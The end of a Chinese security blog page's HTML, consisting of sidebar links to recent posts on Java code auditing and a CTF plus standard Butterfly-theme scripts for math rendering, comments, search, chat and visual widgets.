href="/2021/11/05/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13/" title="java代码审计3">java代码审计3</a><time datetime="2021-11-05T02:37:46.000Z" title="发表于 2021-11-05 10:37:46">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/" title="java代码审计2"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计2"/></a><div class="content"><a class="title" href="/2021/11/01/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/" title="java代码审计2">java代码审计2</a><time datetime="2021-11-01T13:08:39.000Z" title="发表于 2021-11-01 21:08:39">2021-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" title="东华杯"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="东华杯"/></a><div class="content"><a class="title" href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" title="东华杯">东华杯</a><time datetime="2021-11-01T04:27:51.000Z" title="发表于 2021-11-01 12:27:51">2021-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/" title="java代码审计1"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计1"/></a><div class="content"><a class="title" href="/2021/10/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/" title="java代码审计1">java代码审计1</a><time datetime="2021-10-31T08:49:36.000Z" title="发表于 2021-10-31 16:49:36">2021-10-31</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/2.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By upload</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.spacingElementById('content-inner')
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.spacingElementById('content-inner')
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    loader: {
+      source: {
+        '[tex]/amsCd': '[tex]/amscd'
+      }
+    },
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        addClass: [200,() => {
+          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
+            const target = node.parentNode
+            if (!target.classList.contains('has-jax')) {
+              target.classList.add('mathjax-overflow')
+            }
+          })
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', '', 'katex-wrap')
+  })
+})()</script><script>if (document.getElementsByClassName('mermaid').length) {
+  if (window.mermaidJsLoad) mermaid.init()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+      window.mermaidJsLoad = true
+      mermaid.initialize({
+        theme: 'neutral',
+      })
+      false && mermaid.init()
+    })
+  }
+}</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://upload.love/2021/08/23/%E5%A4%AA%E6%97%A0%E8%81%8A%E4%BA%86%E8%BF%98%E6%98%AF%E5%86%99%E9%A2%98%E6%8A%8A/'
+    this.page.identifier = '2021/08/23/太无聊了还是写题把/'
+    this.page.title = '太无聊了还是写题🐱‍👓'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://你的disqus的 short-name.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script>(function(d, w, c) {
+    w.ChatraID = '';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (true) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
